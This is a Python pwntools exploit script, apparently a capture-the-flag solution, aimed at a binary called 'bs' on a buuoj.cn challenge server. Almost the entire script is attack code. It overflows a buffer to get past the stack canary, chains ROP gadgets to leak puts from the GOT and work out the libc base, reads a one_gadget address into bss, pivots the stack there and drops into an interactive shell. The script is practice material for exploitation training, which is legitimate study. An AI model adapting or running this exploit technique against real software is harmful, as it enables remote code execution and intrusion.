# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './bs'
elf = ELF(binary)
libc = elf.libc
#libc = ELF('')
context.binary = binary
DEBUG = 1
if DEBUG:
    p = process(binary)
    libc = elf.libc
    #p = process(['qemu-arm', binary])
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '29196'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 1
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

def menu(bytes,data):
    sla("How many bytes do you want to send?\n",bytes)
    sleep(0.1)
    se(data)

# 直接跨页覆盖 canary 构造 rop 链
# rop 链调用 read 向 bss 读入 ogg 之后栈迁移到 bss 段

one_gad = one_gadget(libc.path)
puts_plt = 0x4007C0
read_plt = 0x4007E0 
leave_addr = 0x400A9B

pop_rdi_addr = 0x400c03
puts_got = 0x601FB0
pop_rbp_addr = 0x400870
pop_rsi_addr = 0x400c01

bss_addr = 0x602030

dbg("read")

payload  = "\x00"*0x1010 + flat( bss_addr - 0x8 , pop_rdi_addr , puts_got , puts_plt)
payload += flat(pop_rdi_addr , 0 , pop_rsi_addr , bss_addr , 0)
payload += flat(read_plt , leave_addr)
payload = payload.ljust(0x2000,'\x00')
menu(0x2000,payload)

puts_addr = l64()
libc.address = puts_addr - libc.sym['puts']

lg("puts_addr",puts_addr)

se(p64( libc.address + 0x4f322))
# dbg()


p.interactive()

'''
@File    :   bs.py
@Time    :   2021/08/20 10:47:10
@Author  :   Niyah 
'''